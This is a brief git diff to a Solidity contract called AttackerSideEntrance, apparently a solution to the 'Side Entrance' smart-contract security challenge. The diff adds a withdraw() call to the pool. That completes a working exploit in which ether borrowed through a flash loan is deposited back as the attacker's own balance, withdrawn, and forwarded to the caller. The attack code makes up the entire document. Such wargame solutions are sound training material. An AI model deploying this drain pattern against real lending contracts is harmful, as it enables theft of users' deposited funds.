@@ -16,13 +16,12 @@ contract AttackerSideEntrance {
     }
 
     function execute () external payable {
-        console.log("inside receiver now!");
         uint256 amount = address(sideEntranceLenderPool).balance;
         sideEntranceLenderPool.deposit{value: msg.value}();
     }
 
     function sendToAddr () external{
-        
+        sideEntranceLenderPool.withdraw();
         (bool success, bytes memory _data) = msg.sender.call{value: address(this).balance}("");
         require(success, "transaction failed");
     }
